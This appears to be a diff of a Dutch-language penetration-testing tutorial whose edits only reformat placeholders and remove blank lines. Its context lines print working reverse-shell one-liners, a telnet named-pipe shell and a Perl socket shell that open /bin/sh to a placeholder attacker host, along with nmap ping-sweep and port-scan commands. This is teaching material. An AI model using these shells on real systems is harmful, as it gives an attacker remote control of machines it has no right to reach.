@@ -138,8 +138,6 @@ Heel af en toe kom je wel eens ene omgeving tegen waarin je geheel geen toegang 
 
     mknod bp p; telnet < ip > < port > 0<bp | /bin/bash 1>bp
 
-
-
 ### Perl
 
     perl -e 'use Socket;$i="< ip >";$p=< port >;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -701,11 +699,11 @@ Dit kun je ook eenvoudiger maken met de tool netdiscover en de schakeloptie -p.
 #### Ping sweep ####
 Een ping sweep is iets wat in gemonitorde omgevingen waarschijnlijk op zal vallen en het zal alleen werken als er geen ICMP filtering is geïmplementeerd. ICMP filtering voorkomt immers dat een host op een PING verzoek kan reageren.
 
-Probeer zelf een programma te schrijven die het ICMP Ping pakket verzend, of gebruik nmap -sP <ipange> om het IP adres van je home lab server te vinden.
+Probeer zelf een programma te schrijven die het ICMP Ping pakket verzend, of gebruik nmap -sP < ipange > om het IP adres van je home lab server te vinden.
 
 
 ### Port scan ###
-nmap -p <ports> <ip>
+nmap -p < ports > < ip >
 
  
 
